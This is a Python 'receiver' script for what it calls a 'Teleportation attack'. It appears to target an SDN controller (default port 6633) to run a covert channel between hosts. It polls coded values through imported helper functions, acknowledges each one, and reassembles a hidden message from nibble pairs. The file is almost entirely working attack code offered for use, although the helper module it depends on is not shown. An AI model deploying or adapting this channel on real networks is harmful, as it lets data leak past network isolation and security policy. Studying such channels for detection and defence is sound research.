#!/usr/bin/python3
# Teleportation attack
# RECEIVER script
from common import *
import time, argparse
from ipaddress import ip_address


def main(ip_controller, port_controller):
    # Wait for beginning of transmission & inform sender of our presence
    start_time = time.time()
    while not test_value(ip_controller, port_controller, 0xEF):
        time.sleep(0.250)
    print('Start-of-Transmission received, starting ...')
    time.sleep(2 - (time.time()-start_time))

    # Acknowledge th
    s,status = secure_connect(ip_controller, port_controller, 0xDF)
    time.sleep(0.250)
    s.close()
    print('ACK sent ...')
    end_of_message = False
    char_received = []

    # Receiving loop
    while not end_of_message:
        # Check if we have reached End-of-Transmission
        if test_value(ip_controller, port_controller, 0xFF):
            print('End-of-transmission received, assembling back the message from values')
            end_of_message = True
            break
        # Test all possible values
        for i in range(1, 17):
            if test_value(ip_controller, port_controller, i):
                char_received.append(i-1)
                print(f'Value {i - 1} received...')
                s,status = secure_connect(ip_controller, port_controller, 0xDF)
                time.sleep(1)
                s.close()
                break

    # Print the message received
    it = iter(char_received)  # Create interator
    char_received = list(zip(it, it))  # create tuple list [(6, 15), (6, 12), (6, 1)]
    message = ''
    for element in char_received:
        message += chr(int(str(f'{element[0]:x}') + str(f'{element[1]:x}'), 16))  # Rebuild message from dec to hex
    print(f'Message received : {message} has been received in {round(time.time()-start_time, 2)} seconds.')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--controller", help="IPv4 address used by the remote controller, localhost by default.",
                        type=str, default='127.0.0.1')
    parser.add_argument("--port", help="Port used by the remote controller, 6633 by default.",
                        type=int, default=6633)
    args = parser.parse_args()
    # Few checks before we start ...
    # Does controller IP is valid ?
    try:
        controller_ip = ip_address(args.controller)
    except ValueError:
        print(f'{args.controller} is not a valid IP Address !')
        exit()
    # Does controller PORT is valid ?
    if not 1 <= args.port <= 65535:
        print(f'{args.port} is not a valid port, it need to be within the range 1-65535 !')
        exit()
    # Loop the transmission, receiver will start to listen when we send the first Start-of-Transmission
    while True:
        print('Receiver script started...')
        main(args.controller, args.port)
        time.sleep(2)  # Wait two seconds between each try

